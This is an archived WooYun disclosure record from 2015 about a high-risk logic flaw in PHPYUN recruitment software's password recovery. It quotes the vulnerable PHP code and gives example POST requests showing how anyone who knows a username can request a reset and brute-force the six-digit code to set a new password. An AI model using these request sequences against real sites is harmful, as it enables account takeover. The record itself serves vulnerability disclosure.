{"id": 66057, "wybug_id": "wooyun-2015-0127151", "wybug_title": "PHPYUN最新版任意密码暴力重置(需爆破6位数）", "wybug_corp": "php云人才系统", "wybug_author": "menmen519", "wybug_date": "2015-07-20 14:06", "wybug_open_date": "2015-10-18 14:18", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向公众公开  简要描述： PHPYUN最新版任意密码暴力重置条件为：后台需开启邮件密码找回功能，默认不开启 详细说明：  这个逻辑其实是一个传统的逻辑，首先我们分析一下代码：条件一：如果允许用户找回密码操作，phpyun就必须后台配置email或者短信，为了分析方便我们注释掉这一块:可以确定官网demo是开启了这个配置，因为它允许用户找回密码wap/forgetpw.class.php:\nfunction send_action(){\t\t$username=yun_iconv(\"utf-8\",\"gbk\",$_POST['username']);\t\tif(!$this->CheckRegUser($username)&&!$this->CheckRegEmail($username)){\t\t\t$res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"用户名不符合规范！\");\t\t\t$res['type']='8';\t\t\techo json_encode($res);die;\t\t}\t\t$M=$this->MODEL(\"userinfo\");\t\t$where=array(\"`username`='\".$username.\"' or `email`='\".$username.\"' or `moblie`='\".$username.\"'\");\t\t$info=$M->GetMemberOne($where,array(\"field\"=>\"`uid`,`username`,`email`,`moblie`\"));        if($info['uid']){\t\t\t$sendcode=rand(100000,999999);\t\t\tsetcookie(\"moblie_code\",$sendcode,time()+120, \"/\");\t\t\t/*            if($_POST['sendtype']=='email'){                if(!($this->config['sy_smtpserver']!=\"\" && $this->config['sy_smtpemail']!=\"\" && $this->config['sy_smtpuser']!=\"\")){                    $res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"还没有配置邮箱，请联系管理员！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }elseif($this->config['sy_email_getpass']==\"2\"){                \t$res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"网站未开启邮件找回密码！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }            }else{                if(!$this->config[\"sy_msguser\"] || !$this->config[\"sy_msgpw\"] || !$this->config[\"sy_msgkey\"]){                    $res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"还没有配置短信，请联系管理员！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }elseif($this->config['sy_msg_getpass']==\"2\"){                    $res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"网站未开启短信找回密码！\");\t                $res['type']='8';\t                echo json_encode($res);die;                }            }            */\t\t\t$fdata=$this->forsend(array('uid'=>$info['uid'],'usertype'=>$info['usertype']));\t\t\t$data['uid']=$info['uid'];            $data['username']=$info['username'];\t\t\t$data['name']=$fdata['name'];\t\t\t$data['type']=\"getpass\";            if($_POST['sendtype']=='email'){                $data['email']=$info['email'];            }else{                $data['moblie']=$info['moblie'];            }\t\t\t$data['sendcode']=$sendcode;\t\t\t$data['date']=date(\"Y-m-d\");\t\t\t$status=$this->send_msg_email($data);\t\t\tif($_POST['sendtype']=='email'){\t\t\t\t$check=$info['email'];\t\t\t}else{\t\t\t\t$check=$info['moblie'];\t\t\t}            $cert=$M->GetCompanyCert(array(\"uid\"=>$info['uid'],\"type\"=>\"5\",\"check\"=>$check),array(\"field\"=>\"`uid`,`check2`,`ctime`,`id`\"));            if($cert){                $M->UpdateCompanyCert(array(\"check2\"=>$sendcode,\"ctime\"=>time()),array(\"id\"=>$cert['id']));            }else{                $M->AddCompanyCert(array('type'=>'5','status'=>0,'uid'=>$info['uid'],'check2'=>$sendcode,'check'=>$check,'ctime'=>time()));            }\n从以上代码可以看出来，只要知道用户名即可，这个太方便了，我在系统里面注册了一个用户名为test的用户url:http://localhost/phpyun40/upload/index.php?c=forgetpw&m=wap&a=sendpostdata:username=test&sendtype=email这样就会在cert表里面存储一个东西，看看抓到的sql是什么：如果之前这个人找回过密码也就是数据库里面存在记录，那么就执行UPDATE `phpyun_company_cert` SET `check2`=486196,`ctime`=1437024758 WHERE 1 and `id`='1'如果没有记录就会进行insert操作INSERT INTO `phpyun_company_cert` SET `type`='5',`status`='0',`uid`='1',`check2`='674584',`check`='test@test.com',`ctime`='1437024891'这个check2 居然是个六位的纯数字，我们在看看check2是怎么产生的$sendcode=rand(100000,999999);我们继续在看这一段代码：\nfunction editpw_action(){        $username=yun_iconv(\"utf-8\",\"gbk\",$_POST['username']);\t\tif(!$this->CheckRegUser($username)&&!$this->CheckRegEmail($username)){            $res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"用户名不符合规范！\");            $res['type']='8';            echo json_encode($res);die;\t\t}\t\t$M=$this->MODEL(\"userinfo\");\t\t$where=array(\"`username`='\".$username.\"' or `email`='\".$username.\"' or `moblie`='\".$username.\"'\");\t\t$info = $M->GetMemberOne($where,array(\"field\"=>\"`uid`,`username`,`email`,`moblie`\"));\t\tif($_POST['sendtype']=='email'){\t\t\t$check=$info['email'];\t\t}else{\t\t\t$check=$info['moblie'];\t\t}\t\t$cert = $M->GetCompanyCert(array(\"uid\"=>$info['uid'],\"type\"=>\"5\",\"check\"=>$check),array(\"field\"=>\"`uid`,`check2`,`ctime`,`id`\"));        if($_POST['code']!=$cert['check2']){\t\t\t$res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"验证码错误\");\t\t\t$res['type']='8';\t\t\techo json_encode($res);die;\t\t}        if(!$_POST['password']){\t\t\t$res['msg']=yun_iconv(\"gbk\",\"utf-8\",\"请完整填写信息！\");\t\t\t$res['type']='8';\t\t\techo json_encode($res);die;\t\t}        $password = $_POST['password'];       \t        if(is_array($info))        {            if($this->config[sy_uc_type]==\"uc_center\" && $info['name_repeat']!=\"1\")            {                $this->uc_open();                uc_user_edit($info[username], \"\", $password, $info['email'],\"0\");            }else{            \t                $salt = substr(uniqid(rand()), -6);                $pass2 = md5(md5($password).$salt);                $M->UpdateMember(array(\"password\"=>$pass2,\"salt\"=>$salt),array(\"uid\"=>$cert['uid']));            }\n要想更改这个用户的密码，由以下几个条件第一个email  这个其实等于不是条件，因为这个email是内部传输的，这样一来就为我们减轻了一个参数，其实就是里面的check第二个，check2 这个就是我们刚才的六位纯数字url:http://localhost/phpyun40/upload/index.php?c=forgetpw&m=wap&a=editpwpostdata:username=test&password=111111&sendtype=email&code=674584看看后台抓取的sql:2015/7/16 13:38\tUPDATE `phpyun_member` SET `password`='b14a85b5b44b9a523d20ec497fa82f0c',`salt`='01ad17' WHERE 1 and `uid`='1'跟我们分析的一模一样那么下来的问题就落在了 这个六位纯数字了 我们brute跑跑看看：\n\n看到这个这个长度了就是了破解成功六位纯数字的爆破解释 可以参考 WooYun: 21cn密码找回功能设计缺陷（爆破）   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-07-20 14:16 厂商回复： 感谢提供！我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}